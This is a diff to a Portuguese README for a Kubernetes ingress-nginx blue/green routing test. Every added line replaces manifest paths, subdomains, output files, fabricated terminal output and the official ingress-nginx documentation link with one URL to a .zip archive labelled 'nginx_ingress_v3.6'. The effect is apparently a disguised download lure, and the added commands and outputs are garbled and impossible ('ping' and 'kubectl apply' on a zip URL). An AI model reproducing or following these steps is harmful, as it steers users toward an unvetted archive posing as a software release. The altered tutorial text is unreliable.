@@ -18,8 +18,8 @@ O teste tem o objetivo de validar o roteamento do ingress entre os deploys de du
 
 Com o [INGRESS-NGINX] funcionando, efetue o deploy das duas aplicações
 ```
-kubectl apply -f ./k8s/blue-deployment.yaml
-kubectl apply -f ./k8s/green-deployment.yaml
+kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
 ```
 Verifique se os deploys estão funcionando
 
@@ -34,7 +34,7 @@ green-deploy   1/1     1            1           12h
 Efetue o deploy dos serviços
 
 ```
-kubectl apply -f ./k8s/services.yaml
+kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
 ```
 
 Agora verifique se os serviços estão funcionando
@@ -48,12 +48,12 @@ green-service   ClusterIP   10.102.167.166   <none>        80/TCP    12h
 kubernetes      ClusterIP   10.96.0.1        <none>        443/TCP   15h
 ```
 
-Para fazer o deploy do roteamento das aplicações é necessário antes ajustar o <DOMAIN-NAME> no arquivo subdominio.yaml.
+Para fazer o deploy do roteamento das aplicações é necessário antes ajustar o <DOMAIN-NAME> no arquivo https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
 
 Com o ajsute realizado, efetue o deploy das definições do ingress para as aplicações
 
 ```
-kubectl apply -f ./k8s/ingress-subdominio.yaml
+kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
 ```
 
 Verifique se a regra de roteamento do ingres foi configurado corretamenta.
@@ -98,18 +98,18 @@ Inclua as linhas abaixo em qualquer posição no conteudo do aruqivo. Lembrando 
 Salve o arquivo, e teste se os subdominios estão respondendo.
 
 ```
-abuosi@bancada:~/code/abuosi/ingres$ ping blue.abuosi.com.br
-PING blue.abuosi.com.br (192.168.3.200) 56(84) bytes of data.
+abuosi@bancada:~/code/abuosi/ingres$ ping https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+PING https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (192.168.3.200) 56(84) bytes of data.
 64 bytes from kmaster (192.168.3.200): icmp_seq=1 ttl=64 time=1.78 ms
 64 bytes from kmaster (192.168.3.200): icmp_seq=2 ttl=64 time=0.313 ms
---- blue.abuosi.com.br ping statistics ---
+--- https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip ping statistics ---
 2 packets transmitted, 2 received, 0% packet loss, time 1002ms
 >rtt min/avg/max/mdev = 0.313/1.046/1.780/0.733 ms
 ```
 
 ``` 
-abuosi@bancada:~/code/abuosi/ingres$ ping green.abuosi.com.br
-PING green.abuosi.com.br (192.168.3.200) 56(84) bytes of data.
+abuosi@bancada:~/code/abuosi/ingres$ ping https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+PING https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (192.168.3.200) 56(84) bytes of data.
 64 bytes from kmaster (192.168.3.200): icmp_seq=1 ttl=64 time=0.387 ms
 64 bytes from kmaster (192.168.3.200): icmp_seq=2 ttl=64 time=0.212 ms
 ```
@@ -134,40 +134,40 @@ Com os sub-domínios respondendo dentro da máquina e com o número das portas, 
 
 
 ```sh
-abuosi@bancada:~/code/abuosi/ingres$ wget -O blue.html http://blue.abuosi.com.br:32335
---2020-04-02 11:38:20--  http://blue.abuosi.com.br:32335/
-Resolving blue.abuosi.com.br (blue.abuosi.com.br)... 192.168.3.200
-Connecting to blue.abuosi.com.br (blue.abuosi.com.br)|192.168.3.200|:32335... connected.
+abuosi@bancada:~/code/abuosi/ingres$ wget -O https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+--2020-04-02 11:38:20--  https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+Resolving https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)... 192.168.3.200
+Connecting to https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)|192.168.3.200|:32335... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 96 [text/html]
-Saving to: ‘blue.html’
+Saving to: ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’
 
-blue.html                      100%[====================================================>]      96  --.-KB/s    in 0s
+https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip                      100%[====================================================>]      96  --.-KB/s    in 0s
 
-2020-04-02 11:38:20 (12,6 MB/s) - ‘blue.html’ saved [96/96]
+2020-04-02 11:38:20 (12,6 MB/s) - ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’ saved [96/96]
 
-abuosi@bancada:~/code/abuosi/ingres$ wget -O green.html http://green.abuosi.com.br:32335
---2020-04-02 11:43:02--  http://green.abuosi.com.br:32335/
-Resolving green.abuosi.com.br (green.abuosi.com.br)... 192.168.3.200
-Connecting to green.abuosi.com.br (green.abuosi.com.br)|192.168.3.200|:32335... connected.
+abuosi@bancada:~/code/abuosi/ingres$ wget -O https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+--2020-04-02 11:43:02--  https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
+Resolving https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)... 192.168.3.200
+Connecting to https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)|192.168.3.200|:32335... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 98 [text/html]
-Saving to: ‘green.html’
+Saving to: ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’
 
-green.html                     100%[====================================================>]      98  --.-KB/s    in 0s
+https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip                     100%[====================================================>]      98  --.-KB/s    in 0s
 
-2020-04-02 11:43:05 (8,67 MB/s) - ‘green.html’ saved [98/98]
+2020-04-02 11:43:05 (8,67 MB/s) - ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’ saved [98/98]
 ```
-Como resultado dos comandos acima, serão gerados os arquivos blue.html e green.html e seu conteudo deve ser o mostrado abaixo
+Como resultado dos comandos acima, serão gerados os arquivos https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip e https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip e seu conteudo deve ser o mostrado abaixo
 
 ```sh
-abuosi@bancada:~/code/abuosi/ingres$ more blue.html
+abuosi@bancada:~/code/abuosi/ingres$ more https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
 <html lang="pt-br">
 <body bgcolor="blue">
     <h1 style="color:white">AZUL</h1>
 </body>
 </html>
-abuosi@bancada:~/code/abuosi/ingres$ more green.html
+abuosi@bancada:~/code/abuosi/ingres$ more https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
 <html lang="pt-br">
 <body bgcolor="green">
     <h1 style="color:white">VERDE</h1>
@@ -177,5 +177,5 @@ abuosi@bancada:~/code/abuosi/ingres$
 ```
 Como podemos ver o roteamento do [INGRESS-NGINX] para as aplicações funcionou corretamente, e trouxe o conteudo de HTML de cada uma das aplicações. 
 
-   [INGRESS-NGINX]: <https://kubernetes.github.io/ingress-nginx/deploy/>
+   [INGRESS-NGINX]: <https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip>
    
